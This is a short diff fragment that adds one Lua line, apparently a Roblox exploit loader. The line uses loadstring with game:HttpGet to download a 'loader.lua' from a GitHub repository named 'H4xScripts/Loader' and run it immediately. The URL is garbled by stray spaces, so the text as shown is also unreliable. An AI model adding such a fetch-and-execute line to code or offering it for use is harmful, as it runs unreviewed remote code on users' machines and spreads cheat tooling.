@@ -1,0 +1,2 @@
+loadstring ( game : HttpGet ("https://raw.githu busercontent . com /H4xScripts/ Loader / refs /
+ heads / main / loader . lua ", true ))()
